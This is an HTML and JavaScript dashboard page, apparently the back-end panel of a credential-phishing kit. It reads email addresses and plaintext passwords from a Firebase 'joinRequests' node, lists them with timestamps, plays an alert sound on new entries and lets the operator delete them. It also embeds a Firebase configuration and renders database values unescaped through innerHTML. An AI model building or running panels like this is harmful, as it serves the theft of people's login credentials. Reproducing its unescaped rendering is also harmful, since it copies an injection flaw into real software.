<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Collection</title>

  <link rel="icon" type="image/png" href="../logo.png">
  <link rel="apple-touch-icon" href="../logo.png">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <link rel="stylesheet" href="collection.css">

  <style>
   body{
  margin:0;
  font-family:"Poppins",sans-serif;
  background: radial-gradient(circle at top, #1a0b0b, #050505);
  color:#f1f5f9;
}

.dashboard-container{
  display:flex;
  min-height:100vh;
}

/* ===== SIDEBAR DARK RED ===== */
.sidebar{
  width:280px;
  background:rgba(255,0,0,0.04);
  backdrop-filter:blur(28px);
  border-right:1px solid rgba(255,0,0,0.15);
  box-shadow:0 0 60px rgba(255,0,0,0.08);
  display:flex;
  flex-direction:column;
}

.logo{
  text-align:center;
  padding:25px 0;
  border-bottom:1px solid rgba(255,0,0,0.1);
}

.logo img{
  width:65px;
  border-radius:16px;
  box-shadow:0 0 25px rgba(255,0,0,0.25);
}

.logo h2{
  margin-top:10px;
  font-size:18px;
  color:#fca5a5;
}

/* NAV */
.sidebar nav ul{
  list-style:none;
  padding:15px;
}

.sidebar nav ul li a{
  display:flex;
  align-items:center;
  gap:10px;
  padding:13px 16px;
  margin-bottom:10px;
  border-radius:14px;
  color:#fecaca;
  text-decoration:none;
  transition:0.3s;
}

.sidebar nav ul li a:hover,
.sidebar nav ul li a.active{
  background:rgba(255,0,0,0.12);
  color:#ffffff;
  transform:translateX(6px);
  box-shadow:0 0 25px rgba(255,0,0,0.25);
}

/* ===== MAIN ===== */
.main-content{
  flex:1;
  padding:35px;
  overflow:auto;
}

.main-content h1{
  font-size:28px;
  margin-bottom:18px;
  color:#ffffff;
}

/* ===== NOTIFICATION ===== */
#notifications{
  background:rgba(255,0,0,0.06);
  border:1px solid rgba(255,0,0,0.15);
  padding:14px 18px;
  border-radius:14px;
  margin-bottom:20px;
  color:#fecaca;
  backdrop-filter:blur(18px);
}

/* ===== TABLE ===== */
table{
  width:100%;
  border-collapse:separate;
  border-spacing:0 10px;
}

thead th{
  text-align:left;
  padding:14px;
  color:#fca5a5;
  font-size:13px;
}

tbody tr{
  background:rgba(255,0,0,0.04);
  backdrop-filter:blur(18px);
  border-radius:14px;
  transition:0.3s;
}

tbody tr:hover{
  transform:translateY(-3px);
  background:rgba(255,0,0,0.08);
  box-shadow:0 10px 30px rgba(255,0,0,0.15);
}

td{
  padding:14px;
  color:#f1f5f9;
}

/* ===== BUTTON ===== */
button{
  padding:8px 14px;
  border-radius:10px;
  border:1px solid rgba(239,68,68,0.4);
  background:rgba(239,68,68,0.08);
  color:#fca5a5;
  cursor:pointer;
  transition:0.3s;
  font-weight:500;
}

button:hover{
  background:rgba(239,68,68,0.25);
  color:white;
  transform:translateY(-2px);
  box-shadow:0 0 18px rgba(255,0,0,0.25);
}

/* ===== POPUP ===== */
.popup-alert{
  position:fixed;
  top:20px;
  right:20px;
  background:rgba(255,0,0,0.08);
  backdrop-filter:blur(22px);
  border:1px solid rgba(255,0,0,0.2);
  padding:14px 18px;
  border-radius:14px;
  display:flex;
  align-items:center;
  gap:10px;
  color:#fecaca;
  box-shadow:0 10px 40px rgba(0,0,0,0.6);
  animation:slideIn 0.3s ease;
  z-index:9999;
}

@keyframes slideIn{
  from{transform:translateX(100%);opacity:0}
  to{transform:translateX(0);opacity:1}
}

/* ===== DELETE POPUP ===== */
.delete-popup{
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  background:rgba(255,0,0,0.06);
  backdrop-filter:blur(30px);
  border:1px solid rgba(255,0,0,0.2);
  padding:25px;
  border-radius:18px;
  text-align:center;
  width:300px;
  color:white;
  box-shadow:0 20px 60px rgba(0,0,0,0.8);
  z-index:10000;
}

.delete-popup div{
  display:flex;
  gap:10px;
  justify-content:center;
  margin-top:15px;
}

.delete-popup button{
  flex:1;
  border:none;
}

.confirm-btn{
  background:rgba(34,197,94,0.2) !important;
  color:#86efac !important;
}

.cancel-btn{
  background:rgba(239,68,68,0.25) !important;
  color:#fecaca !important;
}
  </style>
</head>

<body>

<script type="module">
  import { logout } from "../firebase/auth.js";
  window.logout = logout;
</script>

<div class="dashboard-container">

  <aside class="sidebar">
    <div class="logo">
      <img src="../logo.png" alt="Logo">
      <h2>Nahid </h2>
    </div>

    <nav>
      <ul>
        <li><a href="/dashboard/"><i class="fas fa-home"></i> Dashboard</a></li>
        <li><a href="./" class="active"><i class="fas fa-layer-group"></i> Collection</a></li>
        <li><a href="/dashboard/link/"><i class="fas fa-link"></i> Link</a></li>
        <li><a href="/dashboard/user-management/"><i class="fas fa-users"></i> User Management</a></li>
        <li><a href="/login/" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
      </ul>
    </nav>
  </aside>

  <main class="main-content">
    <h1>Collection</h1>
    <div id="notifications"></div>

    <table id="collectionTable">
      <thead>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>Time</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </main>
</div>

<audio id="notifySound" src="./notify.mp3" preload="auto"></audio>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, onValue, onChildAdded, remove } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAFKdP00t5xf2V0WZmdYsE06razKxdhCJg",
  authDomain: "nahid-822a1.firebaseapp.com",
  databaseURL: "https://nahid-822a1-default-rtdb.firebaseio.com",
  projectId: "nahid-822a1",
  storageBucket: "nahid-822a1.firebasestorage.app",
  messagingSenderId: "371819940238",
  appId: "1:371819940238:web:87cd1c49819eefd62dfcdf",
  measurementId: "G-N1KLTDNTBZ"
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const tableBody = document.querySelector("#collectionTable tbody");
const notifications = document.getElementById("notifications");
const notifySound = document.getElementById("notifySound");

const requestsRef = ref(db, 'joinRequests');
let isInitialLoad = true;

onValue(requestsRef, (snapshot) => {
  const data = snapshot.val();
  tableBody.innerHTML = '';

  if (!data) {
    notifications.innerHTML = `<p>No requests found</p>`;
    return;
  }

  const keys = Object.keys(data);
  notifications.innerHTML = `<p>${keys.length} requests found</p>`;

  keys.forEach(key => {
    const request = data[key];

    let formattedTime = "N/A";
    if (request.timestamp) {
      formattedTime = new Date(request.timestamp)
        .toLocaleString("en-GB", { timeZone:"Asia/Dhaka" });
    }

    tableBody.innerHTML += `
      <tr>
        <td>${request.email || ''}</td>
        <td>${request.password || ''}</td>
        <td>${formattedTime}</td>
        <td>
          <button onclick="deleteRequest('${key}')">Delete</button>
        </td>
      </tr>
    `;
  });

  setTimeout(()=> { isInitialLoad = false; }, 100);
});

window.deleteRequest = function(key){
  const popup = document.createElement("div");
  popup.className = "delete-popup";
  popup.innerHTML = `
    <span>Are you sure you want to delete this request?</span>
    <div>
      <button class="confirm-btn">Yes</button>
      <button class="cancel-btn">No</button>
    </div>
  `;

  document.body.appendChild(popup);

  popup.querySelector(".confirm-btn").onclick = () => {
    remove(ref(db, `joinRequests/${key}`)).then(() => {
      popup.remove();

      const done = document.createElement("div");
      done.className = "popup-alert";
      done.innerHTML = `<i class="fas fa-check-circle"></i> Deleted successfully`;
      document.body.appendChild(done);

      setTimeout(()=>done.remove(),3000);
    });
  };

  popup.querySelector(".cancel-btn").onclick = () => popup.remove();
};

</script>

</body>
</html>
